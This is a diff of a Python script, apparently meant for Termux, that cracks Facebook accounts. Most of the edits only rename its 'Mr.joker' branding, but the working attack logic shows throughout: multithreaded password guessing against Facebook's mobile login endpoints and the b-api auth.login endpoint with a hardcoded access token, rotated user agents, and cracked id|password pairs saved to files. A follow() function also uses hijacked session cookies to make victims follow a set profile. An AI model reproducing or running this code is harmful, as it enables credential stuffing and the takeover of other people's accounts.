@@ -89,9 +89,9 @@ imt="-M4786=="
 ak="CHANG-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.Mr.joker.joker.jokerahsan-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.Mr.jokerahsan-cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.Mr.joker.joker.jokerahsan-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.Mr.jokerahsan-cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -228,7 +228,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( ' [!] \033[1;96mON/OFF MODE PESAWAT JIKA TIDAK ADA Mr.joker.joker.joker\033[1;0m\n')
+	print(logo);print( ' [!] \033[1;96mON/OFF MODE PESAWAT JIKA TIDAK ADA Mr.joker\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -275,7 +275,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [O] Mr.joker.joker.joker OK TERSIMPAN DI : \033[1;92mOK/%s\033[1;97m\n [C] Mr.joker.joker.joker CP TERSIMPAN DI : \033[1;91mCP/%s\033[1;97m\n [O] \033[1;96mON/OFF MODE PESAWAT JIKA TIDAK ADA Mr.joker.joker.joker\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [O] Mr.joker OK TERSIMPAN DI : \033[1;92mOK/%s\033[1;97m\n [C] Mr.joker CP TERSIMPAN DI : \033[1;91mCP/%s\033[1;97m\n [O] \033[1;96mON/OFF MODE PESAWAT JIKA TIDAK ADA Mr.joker\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ Mr.joker.joker.joker ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Mr.joker ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ Mr.joker.joker.joker-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ Mr.joker-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ Mr.joker.joker.joker-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ Mr.joker-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ Mr.joker.joker.joker ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Mr.joker ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ Mr.joker.joker.joker-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ Mr.joker-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ Mr.joker.joker.joker-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ Mr.joker-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/Mr.joker.joker.joker-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/Mr.joker-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -383,7 +383,7 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://www.facebook.com/asadullah.shirzad.56" cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
@@ -391,10 +391,10 @@ logo = ("""\033[1;32m
        
 ╭───────────────────[\033[93mSIMPLE TOOLS FILE CRACK\033[1;32m]──────────────────╮
 │ ┌──────────────────────────────────────────────────────────┐ │
-│ │                   🃏 爪尺. S͢A͢E͢E͢D͢                      │ │
+│ │                   🃏 爪尺. Mr.joker                     │ │
 │ └──────────────────────────────────────────────────────────┘ │
 ╰──────────────────────────────────────────────────────────────╯
-╭──────────────────────── \033[93mMr.joker.joker.joker SCRIPT\033[1;32m ─────────────────────────╮
+╭──────────────────────── \033[93mMr.joker SCRIPT\033[1;32m ─────────────────────────╮
 │ \033[93m╭──────────────────────────────────────────────────────────╮ \033[1;32m│
 │ \033[93m│\033[1;32m    \x1b[1;96mGithub  \x1b[1;97m : \x1b[1;96mMr.joker   \033[93m│ \033[1;32m│
 │ \033[93m│\033[1;32m                               
@@ -402,9 +402,9 @@ logo = ("""\033[1;32m
                               88b  d88 88__dP 
                               88YbdP88 88"Yb  
                               88 YY 88 88  Yb 
-| |  |\x1b[1;96mWhatsapp \x1b[1;97m: \x1b[1;96m93707266012\033[93m│ \033[1;32m│
+| |  |\x1b[1;96mWhatsapp \x1b[1;97m: \x1b[1;96m+93707266012\033[93m│ \033[1;32m│
 │ \033[93m│\033[1;32m  
-                    \x1b[1;96mFacebook \x1b[1;97m: \x1b[1;96m https://www.facebook.com/asadullah.shirzad.56\033[93m │\033[1;32m │
+                    \x1b[1;96mFacebook \x1b[1;97m: \x1b[1;96m https://www.facebook.com/asadullah.shirzad.56 \033[93m │\033[1;32m │
 │ \033[93m╰──────────────────────────────────────────────────────────╯ \033[1;32m│
 ╰──────────────────────────────────────────────────────────────╯\033[1;37m""")
 
@@ -475,7 +475,7 @@ class Main:
 		if TUTUL in ["2", "02"]:
 			Public()
 		if TUTUL in ["3", "03"]:
-			os.system("python joker.py")
+			os.system("python Dump.py")
 		if TUTUL in ["4", "04"]:
 			self.old()
 		if TUTUL in ["5", "05"]:
@@ -507,9 +507,9 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s \x1b[1;97m[H] Mr.joker.joker.joker OK TERSIMPAN DI : OK.txt"%(Y))
-				print("%s \x1b[1;97m[H] Mr.joker.joker.joker CP TERSIMPAN DI : CP.txt"%(G))
-				print("%s \x1b[1;97m[O] ON/OFF MODE PESAWAT JIKA TIDAK ADA Mr.joker.joker.joker\x1b[0m\n"%(P))
+				print("\n%s \x1b[1;97m[H] Mr.joker OK TERSIMPAN DI : OK.txt"%(Y))
+				print("%s \x1b[1;97m[H] Mr.joker CP TERSIMPAN DI : CP.txt"%(G))
+				print("%s \x1b[1;97m[O] ON/OFF MODE PESAWAT JIKA TIDAK ADA Mr.joker\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE...")
@@ -813,7 +813,7 @@ class Main:
   "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
   "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
   "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/Mr.joker.joker.jokerA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/Mr.jokerA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
   "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
   "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
@@ -829,7 +829,7 @@ class Main:
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
-  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMr.joker.joker.joker311 Build/NS6264) CTV",
+  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMr.joker311 Build/NS6264) CTV",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
   "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
@@ -881,7 +881,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ Mr.joker.joker.joker ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ Mr.joker ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -898,15 +898,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ Mr.joker.joker.joker-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Mr.joker-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-Mr.joker.joker.joker-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Mr.joker-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ Mr.joker.joker.joker-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Mr.joker-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-Mr.joker.joker.joker-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Mr.joker-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -934,9 +934,9 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s \x1b[1;97m[+] Mr.joker.joker.joker OK TERSIMPAN DI : OK.txt"%(Y))
-				print("%s \x1b[1;97m[+] Mr.joker.joker.joker CP TERSIMPAN DI : CP.txt"%(G))
-				print("%s \x1b[1;97m[!] ON/OFF MODE PESAWAT JIKA TIDAK ADA Mr.joker.joker.joker\x1b[0m\n"%(P))
+				print("\n%s \x1b[1;97m[+] Mr.joker OK TERSIMPAN DI : OK.txt"%(Y))
+				print("%s \x1b[1;97m[+] Mr.joker CP TERSIMPAN DI : CP.txt"%(G))
+				print("%s \x1b[1;97m[!] ON/OFF MODE PESAWAT JIKA TIDAK ADA Mr.joker\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE...")
@@ -1240,7 +1240,7 @@ class Main:
   "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
   "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
   "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/Mr.joker.joker.jokerA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/Mr.jokerA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
   "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
   "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
@@ -1256,7 +1256,7 @@ class Main:
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
-  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMr.joker.joker.joker311 Build/NS6264) CTV",
+  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMr.joker311 Build/NS6264) CTV",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
   "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
@@ -1308,7 +1308,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [Mr.joker.joker.joker] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Mr.joker] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1325,15 +1325,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ Mr.joker.joker.joker-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Mr.joker-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-Mr.joker.joker.joker-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Mr.joker-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ Mr.joker.joker.joker-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Mr.joker-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-Mr.joker.joker.joker-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Mr.joker-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1342,7 +1342,7 @@ class Main:
 
 
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.Mr.joker.joker.jokerahsan-cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.Mr.jokerahsan-cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://pastebin.com/p3jbWM14").text
